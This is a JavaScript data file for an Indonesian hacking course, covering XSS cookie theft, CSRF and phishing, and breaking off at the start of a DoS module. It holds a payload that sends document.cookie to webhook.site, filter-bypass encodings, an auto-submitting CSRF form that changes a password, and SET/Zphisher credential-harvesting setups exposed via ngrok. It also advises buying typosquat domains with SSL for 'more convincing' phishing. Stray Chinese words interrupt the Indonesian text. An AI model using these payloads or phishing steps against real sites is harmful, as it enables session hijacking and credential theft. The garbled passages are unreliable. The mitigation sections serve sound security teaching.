      { judul: 'Cek webhook — apakah cookie terkirim?', isi: 'Kembali ke tab <code>webhook.site</code>. Refresh. Seharusnya sudah ada 1 request baru dengan parameter <code>c=</code>. Isi parameter itu adalah cookie session user yang sedang membuka halaman itu. <br/><br/>🎉 <strong>Checkpoint Sukses</strong> — kamu berhasil exfiltrate cookie via XSS!' },
      { judul: 'Tantangan: Stored XSS via form komentar', isi: 'Untuk stored XSS (lebih berbahaya karena nempel permanen), coba:<br/>1) Buka form komentar di website (kalau ada di target latihan / DVWA)<br/>2) Submit komentar berisi payload XSS<br/>3) Muat ulang halaman tanpa parameter apapun<br/>4) Script masih jalan? Kalau ya = Stored XSS confirmed.<br/><br/>Catatan: <code>testphp.vulnweb.com</code> tidak punya komentar, jadi coba DVWA (Damn Vulnerable Web App) di docker atau di install lokal.' },
      { judul: 'Proteksi: cookie HttpOnly', isi: 'TIPS untuk防御: kalau server set cookie dengan flag <code>HttpOnly</code>, JavaScript tidak bisa baca <code>document.cookie</code>. Payload di atas tetap jalan tapi tidak bisa mencuri cookie — developer yang baik akan pakai HttpOnly untuk cookie session.' },
    ],
    hpSteps: [
      { judul: 'Setup Termux + XSStrike', isi: 'Install Termux dari F-Droid, lalu: <pre><code>pkg update -y && pkg upgrade -y && pkg install python git -y\npip install xsstrike</code></pre>' },
      { judul: 'Jalankan scan otomatis XSStrike', isi: 'XSStrike bisa otomatis cari XSS. Jalankan: <pre><code>xsstrike -u "http://testphp.vulnweb.com/search.php?test=test"</code></pre>XSStrike akan coba berbagai payload dan lapor hasilnya di terminal HP.' },
      { judul: 'Manual inject via Chrome HP', isi: 'Buka Chrome HP, akses: <code>http://testphp.vulnweb.com/search.php?test=&lt;img src=x onerror=alert(1)&gt;</code>. Kalau keluar popup = XSS confirmed. Sama seperti di PC!' },
    ],
    bedahCommand: [
      {
        command: 'xsstrike -u "URL"',
        penjelasan: [
          { flag: 'xsstrike', arti: 'Tool otomatis untuk scan & eksploitasi XSS' },
          { flag: '-u', arti: 'URL target yang mau di-scan' },
          { flag: '"http://..."', arti: 'URL lengkap, WAJIB pakai tanda kutip' },
        ]
      },
      {
        command: 'fetch("url?c="+document.cookie)',
        penjelasan: [
          { flag: 'fetch()', arti: 'Fungsi JavaScript untuk HTTP request ke URL tertentu' },
          { flag: '"url"', arti: 'URL tujuan (biasanya webhook.site atau server attacker)' },
          { flag: '?c=', arti: 'Query parameter (key "c") tempat data akan dikirim' },
          { flag: 'document.cookie', arti: 'Object JS yang berisi SEMUA cookie halaman saat ini (yang tidak HttpOnly)' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ Popup alert tidak muncul', solusi: 'Tag <code>&lt;script&gt;</code> di-block. Coba tag lain: img, svg, body. Atau double-encode payload: <code>%253Cscript%253E</code> (triple encoding kadang bypasses filter).' },
      { masalah: '❌ Cookie tidak terkirim ke webhook', solusi: 'Pastikan URL webhook benar. Buka DevTools → tab Network → cek apakah ada request ke webhook. Kalau tidak, payload kamu kemungkinan tidak jalan / dimodifikasi server.' },
      { masalah: '❌ Burp Suite tidak intercept request', solusi: 'Cek proxy Chrome: harus 127.0.0.1:8080. Cek Burp: tab Proxy → Intercept harus "is on". Kalau HTTPS, install Burp CA cert dulu.' },
      { masalah: '❌ XSStrike error "module not found"', solusi: 'Install manual: <code>git clone https://github.com/s0md3v/XSStrike && cd XSStrike && pip install -r requirements.txt</code>' },
    ],
    mitigasi: 'Pertahanan dari XSS:<br/><br/>1) <strong>Output Encoding</strong>: semua output user harus di-escape sebelum ditampilkan. <code>&lt;</code> jadi <code>&amp;lt;</code>, <code>&gt;</code> jadi <code>&amp;gt;</code>, <code>"</code> jadi <code>&amp;quot;</code>. Framework modern (React, Vue) auto lakukan ini untuk teks, TAPI JANGAN pakai <code>dangerouslySetInnerHTML</code> atau <code>v-html</code> untuk user input!<br/>2) <strong>Content Security Policy (CSP)</strong>: HTTP header yang whitelist sumber script. Contoh: <code>Content-Security-Policy: script-src \'self\'</code> = blokir inline script dan external script.<br/>3) <strong>HttpOnly Cookie</strong>: cookie session diberi flag HttpOnly → JavaScript tidak bisa baca via document.cookie.<br/>4) <strong>Input Validation</strong>: sanitasi input (tapi SUSAH dilakukan sempurna → pakai output encoding lebih efektif).<br/>5) <strong>WAF (ModSecurity)</strong>: rule akan blok pola umum XSS (script tag, event handler, dll).',
    latihan: [
      '🔰 Coba semua tag bypass: script, img, svg, body, iframe. Mana yang jalan?',
      '🔰 Coba double-encode payload XSS: ubah < jadi %3C jadi %253C. Apakah masih jalan?',
      '🟡 Buat halaman HTML sendiri, taruh di GitHub Pages, paste script XSS untuk tangkap cookie kamu sendiri (aman).',
      '🟡 Coba Stored XSS di DVWA (install Docker: <code>docker run --rm -it -p 80:80 vulnerables/web-dvwa</code>).',
      '🔴 Pelajari CSP: tambah header <code>Content-Security-Policy: script-src \'self\'</code> di DVWA, lalu coba payload XSS lagi. Apakah masih jalan?',
    ],
    faq: [
      { q: 'Apa beda XSS dan CSRF?', a: 'XSS = suntik script yang jalan di browser korban. CSRF = paksa browser korban kirim request tanpa script (cuma HTML form auto-submit). XSS bisa melakukan CSRF juga, tapi CSRF murni tidak butuh JavaScript.' },
      { q: 'XSS masih terbukti bahaya di 2024?', a: 'Masih. Banyak kasus besar: TweetDeck 2014, Steam 2015, British Airways 2018 (XSS di tag img → data Magecart). Sekarang tren-nya jadi "XSS to CSP bypass" — attacker mengerjakan CSP bypass.' },
      { q: 'Apa itu Self-XSS?', a: 'XSS yang efeknya cuma ke user sendiri (misal alert di console setelah paste kode sendiri). TIDAK berbahaya dan sering muncul di prank Facebook. Self-XSS bukan vulnerability server.' },
      { q: 'Kenapa HttpOnly kadang tidak cukup?', a: 'HttpOnly cuma mencegah JavaScript membaca cookie. Penyerang masih bisa melakukan XSS untuk hal lain: keylogging, DOM manipulation, redirect, request via fetch ke endpoint sensitif (CSRF-style), dll.' },
    ],
    ringkasan: [
      'XSS = suntik JS ke halaman yang dilihat user lain',
      '3 tipe: Reflected (URL), Stored (DB), DOM-based (client-side)',
      'Tag bypass: img, svg, body, iframe — coba semua kalau <code>&lt;script&gt;</code> di-block',
      'Payload exfiltrasi: <code>fetch(url+document.cookie)</code> via img onerror',
      'Tool: Burp Suite (intercept), XSStrike (otomatis scan)',
      'Pertahanan: Output Encoding + CSP + HttpOnly Cookie + WAF',
      'Latihan aman: testphp.vulnweb.com (reflected) atau DVWA (stored)',
    ],
    materiTerkait: ['CSRF', 'Session Hijacking', 'WAF Setup', 'Secure Coding'],
  },
  15000, 25000, '💀', 'mudah', 'serangan', false
);

// =========== 3. CSRF ===========
f('⚔️ Cross-Site Request Forgery (CSRF) — Paksa User Lakukan Aksi',
  {
    tujuan: 'Paham apa itu CSRF, mengapa session valid user bisa dipakai untuk aksi berbahaya, bagaimana membuat halaman PoC (Proof of Concept) yang memicu transfer/ganti password tanpa sepengetahuan korban, dan bagaimana cara防御.',
    analogy: 'Bayangkan kamu di restoran. Pelayan mempercayaimu karena kamu pelanggan tetap. Tiba-tiba, orang asing diam-diam menyelipkan pesan "Minta tolong bayar semua makanan teman-teman saya" — kamu antar ke pelayan sambil curiga. Pelayan nurut karena dia percaya kamu. Nah, CSRF persis begitu: server mempercayai browser korban (karena session aktif), tapi yang ngirim request sebenarnya orang lain yang memanfaatkan kepercayaan itu.',
    pengertian: 'Cross-Site Request Forgery (CSRF) adalah serangan yang mengeksploitasi kepercayaan server terhadap browser user. Saat user login ke sebuah situs (misal bankonline), browser menyimpan cookie session. Selama session aktif, browser OTOMATIS kirim cookie itu ke domain yang sama untuk SETIAP request (termasuk yang berasal dari halaman lain). <br/><br/>Penyerang membuat halaman berisi form/URL yang auto-trigger aksi penting (transfer, ganti password, hapus akun) ke situs bank. Saat korban buka halaman penyerang sambil MASIH login ke bank, request terkirim dengan cookie sah → aksi terjadi tanpa konfirmasi user.',
    caraKerja: '1) User login ke bankonline.com → cookie session disimpan di browser. <br/>2) User tanpa Logout buka halaman lain: evil.com. <br/>3) Halaman evil.com berisi form auto-submit dengan action = bankonline.com/transfer (POST) dan field account tujuan = rekening penyerang. <br/>4) Browser kirim POST ke bankonline.com. <br/>5) Browser OTOMATIS sertakan cookie session bankonline (karena domain tujuan = bankonline.com). <br/>6) Bank cek cookie → valid. Bank proses transfer tanpa curiga. <br/>7) Uang pindah ke rekening penyerang. Korban tidak klik apa-apa.',
    asciiDiagram: `[ User login ke bankonline.com ]
              │
              ▼
[ Browser menyimpan cookie session ]
              │
              │ tanpa logout, user buka evil.com
              ▼
[ evil.com punya form auto-submit ]
              │
              │ POST ke bankonline.com/transfer
              ▼
[ Browser otomatis kirim cookie bankonline ]
              │
              ▼
[ Bank online proses transfer karena cookie valid ] 😱`,
    tools: {
      pc: 'Burp Suite Community untuk intercept dan membuat ulang request tanpa token. Browser Chrome. Text editor (Notepad/VS Code) untuk buat HTML PoC.',
      hp: 'Termux + Python simple HTTP server. Browser Chrome Android. QuickEdit app untuk edit HTML.'
    },
    prerequisites: [
      'Paham HTTP method GET vs POST',
      'Paham konsep cookie & session',
      'Paham cara kerja form HTML',
      'Sudah install Burp Suite Community',
    ],
    pcSteps: [
      { judul: 'Cari target yang rentan & aksi sensitif', isi: 'Buka target latihan (DVWA - install via Docker: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code>, login admin/password). Buka halaman yang punya aksi sensitif: "Change Password", "Transfer Money", "Delete Account", "Add to Cart". ' },
      { judul: 'Intercept request csrf via Burp', isi: 'Klik tombol aksi sensitif (misal Change Password). Burp Suite intercept request POST-nya. Lihat parameter body / header. Catat:<br/>• URL tujuan<br/>• Parameter yang dikirim (misal <code>password_new=...&password_conf=...&Change=Change</code>)<br/>• Apakah ada token CSRF (<code>csrf_token</code>, <code>_csrf</code>, atau hidden input).' },
      { judul: 'Test tanpa token CSRF', isi: 'Kirim request tadi ke Burp Repeater. Hapus SEMUA field yang kelihatan seperti CSRF token. Klik "Send". <br/><br/>Hasil:<br/>• <strong>Berhasil (200 OK dengan response sukses)</strong> = TARGET RENTAN! 🎉<br/>• <strong>Gagal (403 Forbidden atau error token)</strong> = target protected CSRF token.' },
      { judul: 'Buat HTML PoC (Proof of Concept)', isi: 'Buat file <code>poc.html</code> di Desktop. Tulis: <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
&lt;form action="http://DVWA-IP/hackable/flags/" 
      method="POST" id="f"&gt;
  &lt;input name="new_password" value="hacked123"&gt;
  &lt;input name="confirm" value="hacked123"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>Form ini akan auto-submit begitu halaman dibuka.' },
      { judul: 'Hosting via Python HTTP server', isi: 'Buka terminal di folder Desktop (tempat poc.html disimpan). Jalankan: <pre><code>python3 -m http.server 8080</code></pre>Server jalan di port 8080.' },
      { judul: 'Tes PoC ke akunmu sendiri', isi: 'Login dulu ke DVWA di Chrome tab lain. Lalu buka tab baru, akses: <code>http://localhost:8080/poc.html</code>. <br/><br/>Browser akan auto-submit form ke DVWA. Cek DVWA: apakah password admin sudah berubah jadi "hacked123"? Kalau iya = CSRF confirmed.' },
      { judul: 'Deploy ke internet (simulasi)', isi: 'Untuk simulasi dikirim ke korban, deploy poc.html ke:<br/>• GitHub Pages (gratis, <code>username.github.io</code>)<br/>• Netlify (drag & drop file)<br/>• Vercel<br/><br/>Bangun link publik → kirim ke "korban" (kalau untuk testing, kirim ke diri sendiri / lab) via email, chat, dll.' },
    ],
    hpSteps: [
      { judul: 'Setup Termux + Python server', isi: 'Install Termux dari F-Droid: <pre><code>pkg update -y && pkg upgrade -y && pkg install python -y</code></pre>' },
      { judul: 'Buat HTML PoC di HP', isi: 'Download & install QuickEdit dari Play Store. Buat file baru <code>poc.html</code>, salin HTML dari tutorial PC (sesuaikan URL target dengan IP lokal DVWA kamu).' },
      { judul: 'Jalankan server dari HP', isi: 'Di Termux pindah ke folder poc.html: <pre><code>cd /sdcard/Download\npython3 -m http.server 8080</code></pre>' },
      { judul: 'Tes dari Chrome HP', isi: 'Buka Chrome HP → akses <code>http://localhost:8080/poc.html</code> sambil login ke DVWA di tab lain → form auto-submit → cek apakah aksi berhasil.' },
    ],
    bedahCommand: [
      {
        command: 'document.getElementById("f").submit()',
        penjelasan: [
          { flag: 'document', arti: 'Object global yang mewakili halaman HTML' },
          { flag: 'getElementById', arti: 'Cari element HTML berdasarkan id' },
          { flag: '"f"', arti: 'Id dari form target (sesuaikan dengan form kamu)' },
          { flag: '.submit()', arti: 'Method yang otomatis submit form ke server' },
        ]
      },
      {
        command: 'python3 -m http.server 8080',
        penjelasan: [
          { flag: 'python3', arti: 'Panggil Python versi 3' },
          { flag: '-m', arti: 'Jalankan module tertentu' },
          { flag: 'http.server', arti: 'Module bawaan Python: simple web server' },
          { flag: '8080', arti: 'Port yang dipakai (default http.server: 8000)' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ DVWA return 403 / "CSRF token is invalid"', solusi: 'Beberapa aksi pakai CSRF token. Capture token sekali pakai Burp, atau target aksi yang lebih sederhana seperti "Add to Cart" atau "Logout".' },
      { masalah: '❌ Form tidak auto-submit', solusi: 'Cek JavaScript console (F12). Pastikan id form benar. Coba gunakan <code>&lt;body onload="document.forms[0].submit()"&gt;</code> sebagai alternatif.' },
      { masalah: '❌ Target kedaluwarsa saat submit', solusi: 'Cookie DVWA kadaluarsa tiap beberapa menit. Login ulang. Atau tambah <code>Cookie: PHPSESSID=...</code> manual di Burp.' },
      { masalah: '❌ Tidak bisa hosting Python server', solusi: 'Cek firewall. Coba port lain: <code>python3 -m http.server 9000</code>. Atau pakai tools seperti <code>ngrok</code> untuk tunneling.' },
    ],
    mitigasi: 'Pertahanan dari CSRF:<br/><br/>1) <strong>CSRF Token</strong> (pertahanan utama): setiap form sensitif harus berisi token random unik per session. Server cek token setiap request. Token harus tidak bisa ditebak attacker (pakai CSPRNG).<br/>2) <strong>SameSite Cookie</strong>: cookie diberi flag <code>SameSite=Strict</code> atau <code>SameSite=Lax</code>. Browser TIDAK kirim cookie ini ke cross-site request, sehingga CSRF otomatis gagal.<br/>3) <strong>Double Submit Cookie</strong>: server set cookie + terima di body/header, bandingkan. Stateless, sederhana.<br/>4) <strong>Origin/Referer Check</strong>: server cek header <code>Origin</code> atau <code>Referer</code> — pastikan request berasal dari domain sendiri.<br/>5) <strong>Re-authentication untuk Aksi Sensitif</strong>: untuk transfer uang atau perubahan password besar, minta user input password lagi.<br/>6) <strong>CAPTCHA pada Aksi Sensitif</strong>: tambah Google reCAPTCHA untuk cross-check ini bukan bot.',
    latihan: [
      '🔰 Buat PoC CSRF paling sederhana: ubah bahasa akun Twitter/FB (kalau ada di lab).',
      '🟡 Coba PoC dengan iframe tersembunyi: <code>&lt;iframe style="display:none" src="http://target/aksi"&gt;</code> — apakah juga kena CSRF?',
      '🟡 Cek target latihan tanpa login (bypass session check) — apakah server beda respons?',
      '🔴 Pelajari SameSite Cookie: edit DVWA config untuk set cookie SameSite=None, lalu coba PoC lagi.',
    ],
    faq: [
      { q: 'Apa beda CSRF dan XSS?', a: 'CSRF tidak butuh JavaScript — cukup HTML. XSS menyuntik script yang jalan di korban. CSRF memanfaatkan session valid korban, XSS mencuri session korban. Banyak XSS modern dipakai untuk CSRF.' },
      { q: 'Apakah semua website rentan CSRF?', a: 'Tidak. Website modern dengan framework (Rails, Django, Spring) dan SameSite cookies otomatis aman. Yang rentan biasanya: aplikasi legacy custom tanpa framework, API endpoint tanpa token.' },
      { q: 'Bagaimana SameSite=Lax vs Strict?', a: 'Strict: cookie tidak dikirim ke cross-site request sama sekali. Paling aman tapi bisa break link dari email/chat. Lax: cookie dikirim untuk top-level navigation GET (klik link aman), tapi tidak untuk POST. Rekomendasi default.' },
      { q: 'CSRF masih relevan di 2024?', a: 'Relevan untuk API endpoint dan form custom yang tidak pakai framework. Banyak SaaS modern sudah aman, tapi lupa implement sekali saja sudah jadi bug besar.' },
    ],
    ringkasan: [
      'CSRF = server percaya browser korban → attacker exploit kepercayaan itu',
      'Syarat sukses: user login di situs A + visit situs B + form auto-submit ke A',
      'TIDAK butuh JavaScript (cukup HTML + JS opsional)',
      'Token CSRF = pertahanan utama + SameSite Cookie',
      'Tool: Burp Suite untuk identifikasi + capture',
      'Latihan: DVWA via Docker (aman & legal)',
      'Tanda rentan: aksi sensitif tanpa token atau tanpa Origin check',
    ],
    materiTerkait: ['XSS', 'Session Hijacking', 'Secure Coding', 'WAF Setup'],
  },
  20000, 30000, '⚔️', 'menengah', 'serangan', false
);

// =========== 4. PHISHING ===========
f('🎣 Phishing & Social Engineering — Manipulasi Psikologis untuk Mencuri Data',
  {
    tujuan: 'Paham perbedaan phishing, social engineering, dan pretexting. Bisa buat halaman login palsu yang MIRIP website asli, host di internet, dan melancarkan simulasi phishing ke diri sendiri untuk aware. Memahami teknik vishing, smishing, dan BEC.',
    analogy: 'Phishing itu kayak "tukan tipu" yang menyamar jadi kurir paket. Dia pakai seragam, bawa kardus, datang ke rumah kamu ngomong "Ada paket buat Anda, tolong tanda tangan sini". Padahal kardus itu cuma kedok untuk lihat isi rumah kamu. Sama persis: phisher pakai email/domain/Tampilan web yang MIRIP asli untuk menipu kamu kasih data sensitif.',
    pengertian: 'Phishing adalah serangan yang mengelabui target dengan menyamar sebagai entitas terpercaya (bank, tempat kerja, teman, brand besar) untuk mencuri data sensitif (password, OTP, data kartu kredit) atau memicu aksi tertentu (klik link, download malware). <br/><br/>Social engineering adalah payung besar yang juga mencakup phishing. Ini serangan yang mengeksploitasi PSIKOLOGI MANUSIA (rasa takut, urgency, curiosity, greed), bukan teknologi. Lebih mudah menipu orang memberi password daripada meretas database encryption-nya.',
    caraKerja: '1) <strong>Reconnaissance</strong>: attacker riset target — LinkedIn, Facebook, email pattern kantor (@perusahaan.co.id). <br/>2) <strong>Setup infra</strong>: daftar domain mirip (misal "g00gle.com", "banksyariah-id.com"), setup SSL gratis (Let\\'s Encrypt), clone halaman login. <br/>3) <strong>Craft lure</strong>: buat pesan meyakinkan dengan urgensi. Contoh: "Aktivasi ulang akun BCA Anda dalam 24 jam atau akun diblokir!". <br/>4) <strong>Distribute</strong>: kirim ke banyak target via email blast, WhatsApp broadcast, atau targeted spear-phishing ke eksekutif tertentu. <br/>5) <strong>Capture</strong>: target klik link → masuk ke fake site → ketik kredensial → attacker terima data real-time.',
    asciiDiagram: `Email phishing tipikal:

┌────────────────────────────────────────┐
│ From: security@banksyariah-id.com      │ ← palsu, domain mirip
│ To: customer@target.com                │
│ Subject: ⚠️ Aktivitas mencurigakan!    │
│                                        │
│ Yth Bapak/Ibu,                        │
│                                        │
│ Sistem kami mendeteksi login           │
│ mencurigakan dari Jakarta.             │
│                                        │
│ Mohon verifikasi dalam 24 jam:        │
│ https://banksyariah-id.com/verify ◄── URL MIRIP (typo squat)
│                                        │
│ Abaikan jika ini bukan Anda.          │
│                                       │
│ - Tim Keamanan Bank Syariah (Palsu!) │
└────────────────────────────────────────┘

↓ Target klik → fake login page → data ke attacker`,
    tools: {
      pc: 'SET (Social Engineering Toolkit, di Kali Linux), GoPhish (open source phishing framework), Evilginx2 (advanced — bypass 2FA via real-time proxy). Untuk lab saja!',
      hp: 'Termux + Zphisher atau SocialFish. Ngrok untuk expose server lokal ke internet.'
    },
    prerequisites: [
      'Paham konsep HTTP & form login',
      'Paham DNS & domain',
      'Punya Linux / Kali Linux / WSL',
      'Install Ngrok (ngrok.com, akun gratis)',
    ],
    pcSteps: [
      { judul: 'Install SET (Social Engineering Toolkit)', isi: 'Di Kali Linux / Ubuntu: <pre><code>sudo apt install set -y\nsudo setoolkit</code></pre>Tunggu SET terbuka. Pilih:<br/>• <strong>1) Social Engineering Attacks</strong><br/>• <strong>2) Website Attack Vectors</strong><br/>• <strong>3) Credential Harvester Attack Method</strong><br/>• <strong>2) Site Cloner</strong>' },
      { judul: 'Cek IP lokal kamu', isi: 'Buka terminal baru, ketik: <pre><code>ip addr show</code></pre>atau <code>ifconfig</code>. Cari IP di interface <code>eth0</code> atau <code>wlan0</code> (misal <code>192.168.1.100</code>). Ini alamat server phishing lokal.' },
      { judul: 'Masukkan URL target untuk di-clone', isi: 'SET akan minta URL target. Masukkan URL halaman login sebuah situs yang asli. Untuk lab, clona halaman login DVWA: <code>http://localhost/login.php</code> atau DVWA Docker yang jalan di IP kamu. <br/><br/>⚠️ JANGAN clone situs production asli kecuali untuk lab pribadi yang tertutup! Dilarang hukum.' },
      { judul: 'SET akan clone halaman + start server', isi: 'SET otomatis: 1) Clone halaman HTML login. 2) Simpan di folder lokal. 3) Start Apache web server di port 80. <br/><br/>Tes: buka browser → akses <code>http://192.168.1.100</code> (IP lokal kamu). Seharusnya muncul halaman login MIRIP target!' },
      { judul: 'Cek log credential', isi: 'Ketik username + password TEST di fake login → klik Submit. Kembali ke terminal SET, scroll ke atas. Seharusnya: <pre><code>POSSIBLE PASSWORD HARVESTED:
Username: testuser
Password: rahasia123</code></pre>🎉 <strong>Checkpoint Sukses</strong> — credential capture berhasil!' },
      { judul: 'Expose ke internet via Ngrok', isi: 'Supaya bisa kirim link ke "korban" (kalau untuk lab, kirim ke diri sendiri). Download Ngrok dari ngrok.com, install: <pre><code>ngrok authtoken TOKEN_DARI_AKUN\nngrok http 80</code></pre>Ngrok akan kasih URL publik seperti <code>https://abcd-1234.ngrok-free.app</code>. Kirim URL ini ke siapapun (untuk lab: kirim ke diri kamu sendiri via email/WhatsApp).' },
      { judul: 'Bikin lebih convincing — beli domain sendiri', isi: 'Untuk phishing yang lebih meyakinkan (advanced):<br/>1) Beli domain TYPOSQUAT — contoh <code>gooogle.co.id</code> (typo), <code>banksyariah-online.com</code> (extra word). Bisa beli di Niagahoster / Namecheap Rp 10-50rb.<br/>2) Pasang SSL gratis via Let\\'s Encrypt.<br/>3) Arahkan domain ke server phishing (Ngrok atau server tetap).<br/>4) Buat halaman login pixel-perfect.' },
      { judul: 'Smishing (SMS phishing)', isi: 'Sekarang bukan hanya email — phisher juga pakai SMS / WhatsApp. Contoh:<br/><br/>"BCA: Transaksi Rp 4.800.000 ke rekening xxx telah berhasil. Jika BUKAN Anda, klik http://bca-verify.tk untuk membatalkan dalam 1 jam atau hubungi 1500ABC."<br/><br/>User panik → klik link → kena phish.<br/><br/>Cara latihan: bikin skenario SMS sendiri (jangan dikirim ke orang nyata), share ke lab / latihan sendiri.' },
      { judul: 'Vishing (Voice phishing)', isi: 'Vishing = telepon mengaku dari bank / polisi / IT support. Teknik umum:<br/>"Selamat, saya dari IT support Microsoft. Ada virus di komputer Anda. Mohon install TeamViewer lalu beri kode remote Anda."<br/><br/>Jangan pernah kasih OTP / remote access ke orang yang telepon / chat. Selalu verifikasi via telepon BALIK ke nomor resmi.' },
    ],
    hpSteps: [
      { judul: 'Install Termux + Zphisher', isi: 'Install Termux dari F-Droid → <pre><code>pkg update -y && pkg install git python php -y\ngit clone https://github.com/htr-tech/zphisher\ncd zphisher && bash zphisher.sh</code></pre>' },
      { judul: 'Pilih template phishing', isi: 'Zphisher punya 30+ template (Facebook, Instagram, Gmail, dll). Untuk LAB, gunakan target dummy / akun sendiri. Pilih template: nomor 1-30 dari list. Pilih port (default 8080).' },
      { judul: 'Generate link + Bagikan via Ngrok', isi: 'Zphisher otomatis display URL localhost + instruksi Ngrok. Run Ngrok: <pre><code>pkg install ngrok\nngrok http 8080</code></pre>Copy URL Ngrok → bagikan (untuk LAB, kirim ke HP kedua / akun kedua kamu).' },
      { judul: 'Cek kredensial terkirim', isi: 'Setiap ada yang login di fake page, Zphisher menampilkan kredensialnya di terminal Termux. Cek di HP kamu!' },
    ],
    bedahCommand: [
      {
        command: 'sudo setoolkit',
        penjelasan: [
          { flag: 'sudo', arti: 'Run sebagai admin (perlu akses root untuk setup Apache + capture)' },
          { flag: 'setoolkit', arti: 'Program Social Engineering Toolkit (TrustedSec, open source)' },
        ]
      },
      {
        command: 'ngrok http 80',
        penjelasan: [
          { flag: 'ngrok', arti: 'Tool tunneling — expose server lokal ke internet via URL publik' },
          { flag: 'http 80', arti: 'Protokol HTTP, port lokal yang mau di-expose (80 default Apache/SET)' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ Apache sudah jalan di port 80 → SET gagal start', solusi: 'Stop Apache: <code>sudo systemctl stop apache2</code>. Lalu jalankan SET lagi.' },
      { masalah: '❌ Ngrok URL tidak bisa dibuka', solusi: 'Cek koneksi. Ngrok Free ada limit 1 endpoint / 40 req/min. Untuk lab, restart dengan <code>ngrok http 8080</code>.' },
      { masalah: '❌ Halaman clone kosong / error', solusi: 'SET butuh Internet untuk clone target. Cek koneksi. Coba URL alternatif.' },
      { masalah: '❌ Target asli deteksi domain phishing', solusi: 'Domain yang kamu pakai akan di-block dalam hitungan jam oleh Google SafeBrowsing / filter email. Untuk lab, gunakan domain throwaway dan jangan kirim ke publik.' },
    ],
    mitigasi: 'Pertahanan dari phishing:<br/><br/>1) <strong>User Awareness Training</strong>: training berkala + simulasi (GoPhish ke karyawan sendiri). Orang yang terlatih bisa detect 90%+ phish.<br/>2) <strong>Email Filtering</strong>: SPF (valid IP pengirim), DKIM (sign email), DMARC (policy block). Tanda centang biru di Gmail bantu.<br/>3) <strong>2FA (Two-Factor Authentication)</strong>: pakai Authenticator app, BUKAN SMS. Bahkan kalau password dicuri via phish, attacker butuh kode 2FA.<br/>4) <strong>Browser anti-phishing</strong>: Chrome & Firefox sudah built-in block situs "Deceptive Site Ahead". JANGAN bypass warning!<br/>5) <strong>Verifikasi via channel kedua</strong>: kalau dapat email transfer uang dari bos, telepon balik ke nomor yang sudah dikenal.<br/>6) <strong>URL Inspection</strong>: biasa baca URL lengkap. <code>bank-bca.com</code> ≠ <code>bank-bca.co.id-login.tk</code>.<br/>7) <strong>Hover check</strong>: sebelum klik, hover link → lihat URL tujuan di status bar browser.',
    latihan: [
      '🔰 Buat HTML clone statis (tanpa backend) dari sebuah halaman login lalu klik link pertama di pojok kiri bawah untuk inspect element.',
      '🔰 Setup GoPhish di Docker lokal, buat kampanye phishing ke email kamu sendiri.',
      '🟡 Latih "spot the phish": cek inbox kamu dan identifikasi 3 email paling mencurigakan.',
      '🟡 Cari tahu: apakah email internal kantor pakai SPF/DKIM? Cek via <code>dig TXT namadomain.com</code>.',
      '🔴 Buat simulated phishing campaign di lab / divisi IT internal (izin atasan) dan ukur click rate.',
    ],
    faq: [
      { q: 'Apakah phishing hanya via email?', a: 'Tidak. Ada smishing (SMS), vishing (telepon), quishing (QR code), social media phishing (DM Instagram / LinkedIn), search engine phishing (iklan Google Ads menggandeng brand asli). Semua varian = social engineering.' },
      { q: 'Apakah belajar phishing untuk edukasi legal?', a: 'Membuat halaman phishing SENDIRI untuk simulasi internal / akademik = biasanya legal. Mengirim phishing ke orang lain tanpa izin = ILEGAL. Selalu dapat izin TERTULIS untuk simulasi.' },
      { q: 'Apa itu BEC (Business Email Compromise)?', a: 'BEC = phishing yang target eksekutif (CEO, CFO). Email mengaku dari CEO minta transfer "urgent" ke rekening baru. Kerugian rata-rata $125,000 per insiden (FBI IC3 2022).' },
      { q: 'Bagaimana cek apakah situs itu palsu?', a: 'Cara cepat: (1) Cek URL lengkap — apakah ada typo? (2) Cek HTTPS — situs legit pakai HTTPS. (3) Cek siapa pemiliknya via <code>whois domain.com</code>. (4) Buka di browser aman dulu, jangan langsung klik link dari email.' },
    ],
    ringkasan: [
      'Phishing eksploitasi psikologi manusia (urgency, fear, greed)',
      '90%+ data breach dimulai dari phishing (Verizon DBIR 2023)',
      'Teknik: Email + SMS + Telepon + QR + Social Media',
      'Tool lab: SET / GoPhish / Zphisher (HANYA untuk lab sendiri)',
      'Domain typosquat & SSL gratis bikin clone sangat meyakinkan',
      'Pertahanan utama: 2FA + User Training + SPF/DKIM/DMARC',
      'Selalu verifikasi via channel kedua untuk request sensitif',
    ],
    materiTerkait: ['Social Engineering Defense', 'Phishing Detection & Prevention', 'MFA Implementation', 'Incident Response'],
  },
  20000, 30000, '🎣', 'menengah', 'serangan', false
);

// =========== 5. DoS/DDoS ===========
f('🌊 DoS/DDoS — Banjir Traffic Sampai Layanan Lumpuh',
  {
    tujuan: 'Paham beda DoS vs DDoS, bagaimana cara kerja berbagai jenis flood attack (SYN flood, UDP flood, HTTP flood, Slowloris), dampaknya, dan cara防御 dengan rate limiting, CDN, dan mitigasi modern.',
    analogy: 'Bayangkan kafe kecil dengan 1 pelayan. Normalnya dia bisa layani 10 customer sekaligus. DDoS itu kayak 1000 orang datang barengan pesan kopi tapi tidak bayar — mereka cuma berdiri pesan ulang-ulang. Pelayan overwhelmed, customer asli harus antri berjam-jam atau pergi. Kafe "lumpuh" meskipun cafe-nya sendiri tidak rusak secara fisik.',
    pengertian: 'Denial-of-Service (DoS) adalah serangan untuk membuat layanan tidak tersedia bagi pengguna sah. Distributed DoS (DDoS) menambah dimensi: attack datang dari ribuan komputer / IoT devices yang已经被 kompromi (botnet).<br/><br/>Tiga jenis utama: <strong>Volume-based</strong> (banjir bandwidth — SYN flood, UDP flood), <strong>Protocol attack</strong> (exploit resource server — Ping of Death, Smurf), <strong>Application layer</strong> (flood HTTP request mahal — Slowloris, HTTP GET flood).',
